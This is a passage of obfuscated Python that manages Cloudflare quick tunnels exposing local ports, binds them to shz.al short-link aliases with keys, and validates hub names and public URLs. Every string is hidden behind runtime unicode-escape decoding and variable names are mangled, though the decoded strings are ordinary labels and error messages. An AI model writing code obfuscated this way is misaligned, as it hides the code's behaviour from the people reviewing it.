codecs.decode('\\u0063\\u006f\\u006e\\u0073\\u0065\\u0063\\u0075\\u0074\\u0069\\u0076\\u0065\\u005f\\u0066\\u0061\\u0069\\u006c\\u0075\\u0072\\u0065\\u0073', 'unicode_escape'): O0_var_1576.consecutive_failures, codecs.decode('\\u006c\\u0061\\u0073\\u0074\\u005f\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0065\\u0072\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): datetime.fromtimestamp(O0_var_1576.last_registered_at, timezone.utc).isoformat().replace(codecs.decode('\\u002b\\u0030\\u0030\\u003a\\u0030\\u0030', 'unicode_escape'), codecs.decode('\\u005a', 'unicode_escape')) if O0_var_1576.last_registered_at is not None else None, codecs.decode('\\u0073\\u0068\\u007a\\u005f\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): O0_var_1576.shz_name, codecs.decode('\\u0073\\u0068\\u007a\\u005f\\u0075\\u0072\\u006c', 'unicode_escape'): codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u002f\\u007e', 'unicode_escape') + O0_var_1576.shz_name if O0_var_1576.shz_name else None} for O0_var_1576 in self._tunnels if O0_var_1576.hostname is not None]

    def create_tunnel(self, port, duplicate=False, silent=False, quic=False, source=codecs.decode('\\u0061\\u0070\\u0069', 'unicode_escape'), shz=False, shz_name=None, shz_key=None):
        O0_var_1577 = bool(shz) or shz_name is not None or shz_key is not None
        if O0_var_1577:
            O0_var_1578 = O0_fn_55(port, shz_name, shz_key)
            if O0_var_1578:
                raise ArgoTunnelError(400, O0_var_1578)
            with self._lock:
                for O0_var_1579 in self._tunnels:
                    if O0_var_1579.port == port and O0_var_1579.shz_name is not None:
                        raise ArgoTunnelError(409, codecs.decode('\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u0020\\u0061\\u006c\\u0072\\u0065\\u0061\\u0064\\u0079\\u0020\\u0068\\u0061\\u0073\\u0020\\u0061\\u0020\\u0062\\u006f\\u0075\\u006e\\u0064\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0028\\u0025\\u0073\\u0029\\u002c\\u0020\\u0075\\u006e\\u0062\\u0069\\u006e\\u0064\\u0020\\u0069\\u0074\\u0020\\u0066\\u0069\\u0072\\u0073\\u0074', 'unicode_escape') % (port, O0_var_1579.shz_name))
        with self._lock:
            if self._by_port.get(port) and (not duplicate):
                raise ArgoTunnelError(409, codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0061\\u006c\\u0072\\u0065\\u0061\\u0064\\u0079\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0073\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u002c\\u0020\\u0073\\u0065\\u0074\\u0020\\u0064\\u0075\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0065\\u003d\\u0074\\u0072\\u0075\\u0065\\u0020\\u0074\\u006f\\u0020\\u0066\\u006f\\u0072\\u0063\\u0065\\u0020\\u0063\\u0072\\u0065\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape') % port)
        O0_var_1580 = CloudflareQuickTunnel(port=port, logger=self.log, silent=silent, use_quic=quic, requester=self._requester, source=source)
        O0_var_1580.on_domain_change = self.on_domain_change
        try:
            O0_var_1580.start()
        except Exception as exc:
            self.log.warning(codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), port, exc)
            raise ArgoTunnelError(500, codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u0020\\u0074\\u006f\\u0020\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % exc) from exc
        with self._lock:
            self._tunnels.append(O0_var_1580)
            self._by_port.setdefault(port, []).append(O0_var_1580)
        O0_var_1581 = None
        if O0_var_1577:
            O0_var_1582 = O0_fn_53(port) if shz_name is None else str(shz_name)
            O0_var_1583 = O0_fn_54(O0_var_1582) if shz_key is None else str(shz_key)
            self._apply_bind(O0_var_1580, O0_var_1582, O0_var_1583, explicit_key=shz_key is not None)
            O0_var_1581 = codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u002f\\u007e', 'unicode_escape') + O0_var_1582
            self._persist_argobinds()
            self._report_bound_async(O0_var_1580)
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064', 'unicode_escape'): True, codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'): O0_var_1580.hostname, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): port, codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): datetime.fromtimestamp(O0_var_1580.created_at, timezone.utc).isoformat().replace(codecs.decode('\\u002b\\u0030\\u0030\\u003a\\u0030\\u0030', 'unicode_escape'), codecs.decode('\\u005a', 'unicode_escape')), codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): O0_var_1580.transport, codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): O0_var_1580.status, codecs.decode('\\u006c\\u0061\\u0073\\u0074\\u005f\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): O0_var_1580.last_error, codecs.decode('\\u006c\\u0061\\u0073\\u0074\\u005f\\u0065\\u0072\\u0072\\u006f\\u0072\\u005f\\u0061\\u0074', 'unicode_escape'): O0_var_1580.last_error_at, codecs.decode('\\u0063\\u006f\\u006e\\u0073\\u0065\\u0063\\u0075\\u0074\\u0069\\u0076\\u0065\\u005f\\u0066\\u0061\\u0069\\u006c\\u0075\\u0072\\u0065\\u0073', 'unicode_escape'): O0_var_1580.consecutive_failures, codecs.decode('\\u0073\\u0068\\u007a\\u005f\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): O0_var_1580.shz_name if O0_var_1577 else None, codecs.decode('\\u0073\\u0068\\u007a\\u005f\\u0075\\u0072\\u006c', 'unicode_escape'): O0_var_1581}

    def _apply_bind(self, O0_var_1584, name, key, explicit_key=False):
        O0_var_1584.shz_name = name
        O0_var_1584.shz_key = key
        O0_var_1584.shz_key_explicit = explicit_key
        O0_var_1584.on_domain_change = lambda old_domain, new_domain: KModeController.report_domain_change(new_domain, name=name, key=key)

    def _report_bound_async(self, O0_var_1585):

        def _report():
            KModeController.report_domain_change(O0_var_1585.hostname, name=O0_var_1585.shz_name, key=O0_var_1585.shz_key)
        threading.Thread(target=_report, daemon=True, name=codecs.decode('\\u0061\\u0072\\u0067\\u006f\\u002d\\u0073\\u0068\\u007a\\u0061\\u006c\\u002d\\u0072\\u0065\\u0070\\u006f\\u0072\\u0074\\u002d\\u0025\\u0064', 'unicode_escape') % O0_var_1585.port).start()

    def _persist_argobinds(self):
        O0_var_1586 = getattr(self, codecs.decode('\\u0073\\u0074\\u006f\\u0072\\u0065', 'unicode_escape'), None)
        if O0_var_1586 is None:
            return False
        O0_var_1587 = []
        with self._lock:
            for O0_var_1588 in self._tunnels:
                if O0_var_1588.shz_name is not None:
                    O0_var_1589 = {codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): O0_var_1588.port, codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): O0_var_1588.shz_name}
                    if O0_var_1588.shz_key is not None and O0_var_1588.shz_key_explicit:
                        O0_var_1589[codecs.decode('\\u006b\\u0065\\u0079', 'unicode_escape')] = O0_var_1588.shz_key
                    O0_var_1587.append(O0_var_1589)
        return O0_var_1586.save_argobinds(O0_var_1587)

    def _locate_tunnel(self, port, tunnel_domain, O0_var_1590):
        with self._lock:
            O0_var_1591 = self._by_port.get(port) or []
            if not O0_var_1591:
                raise ArgoTunnelError(404, codecs.decode('\\u006e\\u006f\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064', 'unicode_escape') % port)
            if tunnel_domain is not None:
                O0_var_1592 = [O0_var_1593 for O0_var_1593 in O0_var_1591 if O0_var_1593.hostname == tunnel_domain]
                if not O0_var_1592:
                    raise ArgoTunnelError(404, codecs.decode('\\u006e\\u006f\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u0020\\u0077\\u0069\\u0074\\u0068\\u0020\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u0020\\u0025\\u0073', 'unicode_escape') % (port, tunnel_domain))
            elif len(O0_var_1591) > 1:
                raise ArgoTunnelError(409, codecs.decode('\\u006d\\u0075\\u006c\\u0074\\u0069\\u0070\\u006c\\u0065\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0073\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u002c\\u0020\\u0073\\u0070\\u0065\\u0063\\u0069\\u0066\\u0079\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u0020\\u0074\\u006f\\u0020\\u0064\\u0069\\u0073\\u0061\\u006d\\u0062\\u0069\\u0067\\u0075\\u0061\\u0074\\u0065', 'unicode_escape') % port)
            else:
                O0_var_1592 = list(O0_var_1591)
            return O0_var_1592[0]

    def bind_tunnel(self, port, tunnel_domain=None, shz_name=None, shz_key=None):
        O0_var_1594 = O0_fn_55(port, shz_name, shz_key)
        if O0_var_1594:
            raise ArgoTunnelError(400, O0_var_1594)
        O0_var_1595 = self._locate_tunnel(port, tunnel_domain, codecs.decode('\\u0062\\u0069\\u006e\\u0064', 'unicode_escape'))
        with self._lock:
            if O0_var_1595.source == codecs.decode('\\u006b\\u006d\\u006f\\u0064\\u0065', 'unicode_escape'):
                raise ArgoTunnelError(409, codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u0020\\u0069\\u0073\\u0020\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0064\\u0020\\u0062\\u0079\\u0020\\u004b\\u004d\\u004f\\u0044\\u0045\\u002c\\u0020\\u0063\\u0061\\u006e\\u006e\\u006f\\u0074\\u0020\\u0062\\u0069\\u006e\\u0064\\u0020\\u0076\\u0069\\u0061\\u0020\\u002f\\u0061\\u0070\\u0069\\u002f\\u0061\\u0072\\u0067\\u006f\\u002f\\u0062\\u0069\\u006e\\u0064', 'unicode_escape') % port)
            for O0_var_1596 in self._tunnels:
                if O0_var_1596 is not O0_var_1595 and O0_var_1596.port == port and (O0_var_1596.shz_name is not None):
                    raise ArgoTunnelError(409, codecs.decode('\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u0020\\u0061\\u006c\\u0072\\u0065\\u0061\\u0064\\u0079\\u0020\\u0068\\u0061\\u0073\\u0020\\u0061\\u0020\\u0062\\u006f\\u0075\\u006e\\u0064\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0028\\u0025\\u0073\\u0029\\u002c\\u0020\\u0075\\u006e\\u0062\\u0069\\u006e\\u0064\\u0020\\u0069\\u0074\\u0020\\u0066\\u0069\\u0072\\u0073\\u0074', 'unicode_escape') % (port, O0_var_1596.shz_name))
        O0_var_1597 = O0_fn_53(port) if shz_name is None else str(shz_name)
        O0_var_1598 = O0_fn_54(O0_var_1597) if shz_key is None else str(shz_key)
        self._apply_bind(O0_var_1595, O0_var_1597, O0_var_1598, explicit_key=shz_key is not None)
        self._persist_argobinds()
        self._report_bound_async(O0_var_1595)
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0062\\u006f\\u0075\\u006e\\u0064', 'unicode_escape'): True, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): port, codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'): O0_var_1595.hostname, codecs.decode('\\u0073\\u0068\\u007a\\u005f\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): O0_var_1597, codecs.decode('\\u0073\\u0068\\u007a\\u005f\\u0075\\u0072\\u006c', 'unicode_escape'): codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u002f\\u007e', 'unicode_escape') + O0_var_1597}

    def unbind_tunnel(self, port, tunnel_domain=None):
        O0_var_1599 = self._locate_tunnel(port, tunnel_domain, codecs.decode('\\u0075\\u006e\\u0062\\u0069\\u006e\\u0064', 'unicode_escape'))
        with self._lock:
            if O0_var_1599.shz_name is None:
                raise ArgoTunnelError(404, codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u0020\\u0068\\u0061\\u0073\\u0020\\u006e\\u006f\\u0020\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u0062\\u0069\\u006e\\u0064\\u0069\\u006e\\u0067', 'unicode_escape') % port)
            O0_var_1600, O0_var_1601 = (O0_var_1599.shz_name, O0_var_1599.shz_key)
            O0_var_1602 = O0_var_1599.hostname
            O0_var_1599.shz_name = None
            O0_var_1599.shz_key = None
            O0_var_1599.shz_key_explicit = False
            O0_var_1599.on_domain_change = self.on_domain_change
        self._persist_argobinds()
        threading.Thread(target=KModeController.delete_shzal, args=(O0_var_1600, O0_var_1601), daemon=True, name=codecs.decode('\\u0061\\u0072\\u0067\\u006f\\u002d\\u0073\\u0068\\u007a\\u0061\\u006c\\u002d\\u0064\\u0065\\u006c\\u0065\\u0074\\u0065\\u002d\\u0025\\u0064', 'unicode_escape') % port).start()
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0062\\u006f\\u0075\\u006e\\u0064', 'unicode_escape'): False, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): port, codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'): O0_var_1602, codecs.decode('\\u0073\\u0068\\u007a\\u005f\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): None, codecs.decode('\\u0073\\u0068\\u007a\\u005f\\u0075\\u0072\\u006c', 'unicode_escape'): None}

    def delete_tunnel(self, port, tunnel_domain=None):
        with self._lock:
            O0_var_1603 = self._by_port.get(port) or []
            if not O0_var_1603:
                raise ArgoTunnelError(404, codecs.decode('\\u006e\\u006f\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064', 'unicode_escape') % port)
            if tunnel_domain is not None:
                O0_var_1604 = [O0_var_1605 for O0_var_1605 in O0_var_1603 if O0_var_1605.hostname == tunnel_domain]
                if not O0_var_1604:
                    raise ArgoTunnelError(404, codecs.decode('\\u006e\\u006f\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u0020\\u0077\\u0069\\u0074\\u0068\\u0020\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u0020\\u0025\\u0073', 'unicode_escape') % (port, tunnel_domain))
            elif len(O0_var_1603) > 1:
                raise ArgoTunnelError(409, codecs.decode('\\u006d\\u0075\\u006c\\u0074\\u0069\\u0070\\u006c\\u0065\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0073\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u002c\\u0020\\u0073\\u0070\\u0065\\u0063\\u0069\\u0066\\u0079\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u0020\\u0074\\u006f\\u0020\\u0064\\u0069\\u0073\\u0061\\u006d\\u0062\\u0069\\u0067\\u0075\\u0061\\u0074\\u0065', 'unicode_escape') % port)
            else:
                O0_var_1604 = list(O0_var_1603)
            O0_var_1606 = [O0_var_1607 for O0_var_1607 in O0_var_1603 if O0_var_1607 not in O0_var_1604]
            if O0_var_1606:
                self._by_port[port] = O0_var_1606
            else:
                self._by_port.pop(port, None)
            self._tunnels = [O0_var_1608 for O0_var_1608 in self._tunnels if O0_var_1608 not in O0_var_1604]
            O0_var_1609 = [{codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'): O0_var_1610.hostname, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): O0_var_1610.port, codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): datetime.fromtimestamp(O0_var_1610.created_at, timezone.utc).isoformat().replace(codecs.decode('\\u002b\\u0030\\u0030\\u003a\\u0030\\u0030', 'unicode_escape'), codecs.decode('\\u005a', 'unicode_escape')), codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): O0_var_1610.transport, codecs.decode('\\u0073\\u0068\\u007a\\u005f\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): O0_var_1610.shz_name, codecs.decode('\\u0073\\u0068\\u007a\\u005f\\u0075\\u0072\\u006c', 'unicode_escape'): codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u002f\\u007e', 'unicode_escape') + O0_var_1610.shz_name if O0_var_1610.shz_name else None} for O0_var_1610 in O0_var_1604]
            O0_var_1611 = []
            for O0_var_1612 in O0_var_1604:
                if O0_var_1612.shz_name is not None:
                    O0_var_1611.append((O0_var_1612.shz_name, O0_var_1612.shz_key))
                    O0_var_1612.shz_name = None
                    O0_var_1612.shz_key = None
                    O0_var_1612.shz_key_explicit = False
        for O0_var_1613 in O0_var_1604:
            O0_var_1613.stop()
        if O0_var_1611:
            self._persist_argobinds()
            for O0_var_1614, O0_var_1615 in O0_var_1611:
                threading.Thread(target=KModeController.delete_shzal, args=(O0_var_1614, O0_var_1615), daemon=True, name=codecs.decode('\\u0061\\u0072\\u0067\\u006f\\u002d\\u0073\\u0068\\u007a\\u0061\\u006c\\u002d\\u0064\\u0065\\u006c\\u0065\\u0074\\u0065', 'unicode_escape')).start()
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0064\\u0065\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape'): len(O0_var_1604), codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): port, codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0073', 'unicode_escape'): O0_var_1609}

    def stop_all(self):
        with self._lock:
            O0_var_1616 = list(self._tunnels)
            self._tunnels.clear()
            self._by_port.clear()
        for O0_var_1617 in O0_var_1616:
            O0_var_1617.stop()
_HUB_RESERVED_KNAMES = frozenset({codecs.decode('\\u0061\\u0070\\u0069', 'unicode_escape'), codecs.decode('\\u0061\\u0067\\u0065\\u006e\\u0074\\u0073', 'unicode_escape'), codecs.decode('\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c', 'unicode_escape'), codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063', 'unicode_escape'), codecs.decode('\\u0073\\u0075\\u0062', 'unicode_escape'), codecs.decode('\\u0066\\u0061\\u0076\\u0069\\u0063\\u006f\\u006e\\u002e\\u0069\\u0063\\u006f', 'unicode_escape')})
_HUB_KNAME_RE = re.compile(codecs.decode('\\u005e\\u005b\\u0061\\u002d\\u007a\\u0030\\u002d\\u0039\\u005d\\u005b\\u0061\\u002d\\u007a\\u0030\\u002d\\u0039\\u002d\\u005d\\u007b\\u0031\\u002c\\u0036\\u0032\\u007d\\u0024', 'unicode_escape'))
_HUB_HOP_HEADERS = frozenset({codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u006b\\u0065\\u0065\\u0070\\u002d\\u0061\\u006c\\u0069\\u0076\\u0065', 'unicode_escape'), codecs.decode('\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065', 'unicode_escape'), codecs.decode('\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u007a\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0074\\u0065', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0061\\u0069\\u006c\\u0065\\u0072', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0061\\u0069\\u006c\\u0065\\u0072\\u0073', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0066\\u0065\\u0072\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'), codecs.decode('\\u0068\\u006f\\u0073\\u0074', 'unicode_escape')})

def O0_fn_43(name):
    O0_var_1618 = (name or codecs.decode('', 'unicode_escape')).strip().lower()
    if not O0_var_1618:
        return codecs.decode('\\u004b\\u004e\\u0041\\u004d\\u0045\\u0020\\u672a\\u8bbe\\u7f6e', 'unicode_escape')
    if not _HUB_KNAME_RE.match(O0_var_1618):
        return codecs.decode('\\u004b\\u004e\\u0041\\u004d\\u0045\\u0020\\u0025\\u0072\\u0020\\u975e\\u6cd5\\u003a\\u0020\\u9650\\u0020\\u0032\\u002d\\u0036\\u0033\\u0020\\u5b57\\u7b26\\u5c0f\\u5199\\u5b57\\u6bcd\\u002f\\u6570\\u5b57\\u002f\\u8fde\\u5b57\\u7b26\\u002c\\u0020\\u9996\\u4f4d\\u5b57\\u6bcd\\u6216\\u6570\\u5b57', 'unicode_escape') % name
    if O0_var_1618 in _HUB_RESERVED_KNAMES:
        return codecs.decode('\\u004b\\u004e\\u0041\\u004d\\u0045\\u0020\\u0025\\u0072\\u0020\\u662f\\u4fdd\\u7559\\u540d\\u002c\\u0020\\u4e0d\\u53ef\\u6ce8\\u518c', 'unicode_escape') % name
    return None
_HUB_PUBLIC_URL_RE = re.compile(codecs.decode('\\u005e\\u0068\\u0074\\u0074\\u0070\\u0073\\u003f\\u003a\\u002f\\u002f\\u005c\\u0053\\u002b\\u0024', 'unicode_escape'))

def O0_fn_44(O0_var_1619):
    O0_var_1620 = (O0_var_1619 or codecs.decode('', 'unicode_escape')).strip().rstrip(codecs.decode('\\u002f', 'unicode_escape'))
    if not O0_var_1620:
        return None
    if len(O0_var_1620) > 512:
        return codecs.decode('\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u0075\\u0072\\u006c\\u0020\\u8fc7\\u957f\\u0020\\u0028\\u0025\\u0064\\u0020\\u003e\\u0020\\u0035\\u0031\\u0032\\u0020\\u5b57\\u7b26\\u0029', 'unicode_escape') % len(O0_var_1620)
    if not _HUB_PUBLIC_URL_RE.match(O0_var_1620):
        return codecs.decode('\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u0075\\u0072\\u006c\\u0020\\u0025\\u0072\\u0020\\u975e\\u6cd5\\u003a\\u0020\\u5fc5\\u987b\\u4ee5\\u0020\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0020\\u6216\\u0020\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0020\\u5f00\\u5934\\u4e14\\u65e0\\u7a7a\\u767d\\u5b57\\u7b26', 'unicode_escape') % O0_var_1620
    return None
_SHZAL_HUB_ALIAS_HOST = codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c', 'unicode_escape')
_SHZAL_HUB_ALIAS_NAME_RE = re.compile(codecs.decode('\\u005e\\u005b\\u0041\\u002d\\u005a\\u0061\\u002d\\u007a\\u0030\\u002d\\u0039\\u002b\\u005f\\u005c\\u002d\\u002a\\u0024\\u003d\\u0040\\u002c\\u003b\\u002f\\u005c\\u005b\\u005c\\u005d\\u005d\\u002b\\u0024', 'unicode_escape'))
_HUB_HOST_LABEL_RE = re.compile(codecs.decode('\\u005e\\u005b\\u0041\\u002d\\u005a\\u0061\\u002d\\u007a\\u0030\\u002d\\u0039\\u005d\\u0028\\u003f\\u003a\\u005b\\u0041\\u002d\\u005a\\u0061\\u002d\\u007a\\u0030\\u002d\\u0039\\u002d\\u005d\\u007b\\u0030\\u002c\\u0036\\u0031\\u007d\\u005b\\u0041\\u002d\\u005a\\u0061\\u002d\\u007a\\u0030\\u002d\\u0039\\u005d\\u0029\\u003f\\u0024', 'unicode_escape'))

def O0_fn_45(O0_var_1621):
    O0_var_1622 = (O0_var_1621 or codecs.decode('', 'unicode_escape')).strip()
    return O0_var_1622 if O0_fn_1(O0_var_1622) else O0_var_1622.rstrip(codecs.decode('\\u002f', 'unicode_escape'))

def O0_fn_46(O0_var_1623):
    if not O0_fn_1(O0_var_1623):
        return None
    O0_var_1624 = (O0_var_1623 or codecs.decode('', 'unicode_escape')).strip()
    if codecs.decode('\\u005c', 'unicode_escape') in O0_var_1624:
        return codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u0048\\u0075\\u0062\\u0020\\u522b\\u540d\\u4e0d\\u5f97\\u5305\\u542b\\u53cd\\u659c\\u6760', 'unicode_escape')
    if any((O0_var_1625.isspace() or unicodedata.category(O0_var_1625) == codecs.decode('\\u0043\\u0063', 'unicode_escape') for O0_var_1625 in O0_var_1624)):
        return codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u0048\\u0075\\u0062\\u0020\\u522b\\u540d\\u542b\\u7a7a\\u767d\\u6216\\u63a7\\u5236\\u5b57\\u7b26', 'unicode_escape')
    if codecs.decode('\\u003f', 'unicode_escape') in O0_var_1624 or codecs.decode('\\u0023', 'unicode_escape') in O0_var_1624:
        return codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u0048\\u0075\\u0062\\u0020\\u522b\\u540d\\u4e0d\\u5f97\\u5305\\u542b\\u0020\\u0071\\u0075\\u0065\\u0072\\u0079\\u0020\\u6216\\u0020\\u0066\\u0072\\u0061\\u0067\\u006d\\u0065\\u006e\\u0074', 'unicode_escape')
    O0_var_1626 = re.fullmatch(codecs.decode('\\u0028\\u005b\\u0041\\u002d\\u005a\\u0061\\u002d\\u007a\\u005d\\u005b\\u0041\\u002d\\u005a\\u0061\\u002d\\u007a\\u0030\\u002d\\u0039\\u002b\\u002e\\u002d\\u005d\\u002a\\u0029\\u003a\\u002f\\u002f\\u0028\\u005b\\u005e\\u002f\\u003f\\u0023\\u005d\\u002b\\u0029\\u0028\\u002f\\u005b\\u005e\\u003f\\u0023\\u005d\\u002a\\u0029', 'unicode_escape'), O0_var_1624)
    if not O0_var_1626:
        return codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u0020\\u0048\\u0075\\u0062\\u0020\\u522b\\u540d\\u975e\\u6cd5', 'unicode_escape')
    O0_var_1627, O0_var_1628, O0_var_1629 = O0_var_1626.groups()
